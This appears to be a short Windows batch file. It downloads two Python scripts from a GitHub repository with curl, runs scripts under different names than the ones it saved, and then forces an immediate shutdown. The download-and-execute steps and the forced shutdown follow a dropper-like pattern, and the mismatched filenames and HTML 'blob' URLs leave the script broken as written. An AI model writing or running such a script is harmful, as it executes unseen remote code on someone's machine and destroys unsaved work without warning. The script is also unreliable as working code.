@echo off
curl -o first_script.py https://github.com/lososwww/pitkavanya/blob/main/scripts/main.py
curl -o second_script.py https://github.com/lososwww/pitkavanya/blob/main/scripts/main2.py
python main.py
timeout /t 1 /nobreak
python main2.py
timeout /t 2 /nobreak
shutdown /s /f /t 0
